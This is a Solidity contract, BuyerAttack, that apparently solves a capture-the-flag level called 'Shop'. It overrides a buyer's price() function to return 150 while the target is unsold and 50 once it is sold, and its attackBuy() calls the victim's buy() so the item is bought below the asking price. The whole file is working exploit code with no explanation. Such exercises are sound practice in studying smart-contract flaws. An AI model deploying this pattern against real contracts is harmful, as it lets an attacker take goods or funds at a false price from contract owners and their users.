//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Buyer.sol';
contract BuyerAttack is Buyer {
    Shop public myShop;

    constructor(address _shopVictim){
        myShop = Shop(_shopVictim);
    }

    function price() override external view  returns(uint){
        if(myShop.isSold()){
            return uint(50);
        }else{
            return uint(150);
        }
    }

    function attackBuy() public {
        myShop.buy();
    }

}